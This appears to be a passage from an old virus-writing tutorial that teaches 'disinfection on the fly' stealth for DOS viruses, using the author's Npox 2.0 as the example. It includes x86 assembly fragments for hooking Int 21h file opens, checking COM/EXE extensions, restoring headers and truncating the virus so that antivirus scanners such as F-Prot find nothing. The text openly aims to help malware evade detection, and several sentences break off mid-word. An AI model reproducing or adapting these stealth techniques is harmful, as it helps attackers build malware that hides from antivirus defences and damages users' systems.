The BEST advantage a virus can have is `Disinfecting of Fly' as we must       
try to basically hide the virus as well as possible! And nowadays Anti-       
Virus programs are going crazy. As I remember at the time Npox 2.0 was        
developed it would Disinfect every file opened by F-prot and Scan and         
when the Scanner found nothing and closed the file to go on to the next       
Npox would re-infect them. Truly can cause havoc, As a matter of fact         
Frisk didn't like this as I had some `Anti Fuck-Prot' routines and he         
added his own routine to open files by Int21h/6C00h, as Npox only             
disinfected on Int21h/3Dh, however to make the virus disinfect on             
Int21h/6C00h, doesn't require much work, simply to take the ASCIIZ            
string at DS:SI and put SI into DX so we have DS:DX pointing to it,           
then run this routine.                                                        
                                                                              
The Basic idea on disinfection is this...                
  -For .COM files                                        
     Restore the first 3 bytes original Bytes of the program, these           
     3 bytes are usually somewhere inside the virus, and then simply          
     remove the virus from the end of the .COM file!                          
     We do this by jumping to the end of the COM file and subtracting         
     the Virus size from the File size and that new value is the              
     original file size!                                                      
     NOTE: if you write a virus that its length changes (Polymorphic)         
     its wise to save the original Filesize to be infected before             
     hand.                                                                    
                                                                              
  -For .EXE files & Overlays                                                  
     This procedure is not different, just that if you changed CS:IP &        
     SP:SS in the EXE header, simply restore the original values, or to       
     save time, simple save the Original EXE header (first 1b bytes) in       
     the virus and right that to the beginning as I did for Npox 2.0          
     Then Subtract yourself from the original size and cut it off!            
                                                                              
I will now follow thru the Npox 2.0 virus routine Closely so you can under    
stand this process.                                                           
                                                         
Okay first thing you would want to do is CHECK if this is
If the virus infects COMs & EXEs, do not waste your time looking thru         
other extensions, or for tight code you can waste your time and "HOPE"        
the `infection' marker will fail! Meaning if the virus uses the seconds       
field set to 60 (as Npox) then naturally only INFECTED files will have        
a time stamp of 60! And this routine is not needed...                         
                                                                              
opening_file:   call    check_extension         ;Check for .COM extension     
                jnc     open_fuck2              ;YES; Jmp & Disinfect         
                call    check_exten_exe         ;Check for .EXE extension     
                jnc     open_fuck2              ;YES; Jmp & disinfect         
                jmp     dword ptr cs:[int21]    ;Other wise goto DOS          
                                                                              
; At this point the file has an .COM or .EXE extension, so we continue

;NOTE: its important you called Int21h YOURSELF! you CAN NOT do a "Int 21h"   
;command, as the virus will intercept it, and will come to this routine       
;and it will continue over and over again, Never ending l

Here now we get the first 3 bytes (for com) or first 1B bytes (EXE header)    
in the Nuke Pox virus I save the ORIGINAL first 3 bytes of the .com at        
the VERY END! Since the buffer I made was 1B hex bytes, it is able to         
hold the EXE header or 3 .com bytes, anyhow the beginning of these            
bytes are the last 1B bytes, since its at the end... figure it out where      
you saved your 3 bytes or exe header for your virus, or use the Npox          
routine...

humm, now we got the original bytes, all we gotta do is write them

We wrote the original file's data back to place, now we need to cut the       
virus off from the file, the virus is written at the end of the file,         
so all we do is set our file-pointer to EOF - Virus_Size, which gives         
us the original file length!                                                  
                                                                              
                pop     dx                      ;EOF - Virus_Size             
                pop     cx                      ;to get ORIGINAL File size    
                sub     dx,virus_size           ;subtract virus size          
                sbb     cx,0                                                  
                mov     ax,4200h

Now this is perhaps the "TRICKIEST" part, in order to "CROP" the file, at     
our new ptr location, what we do it use does to crop it, by writing 0         
bytes to the new location, DOS will make that new location the NEW            
EoF and in result cutting off the virus and deleting its sector in the        
fat.
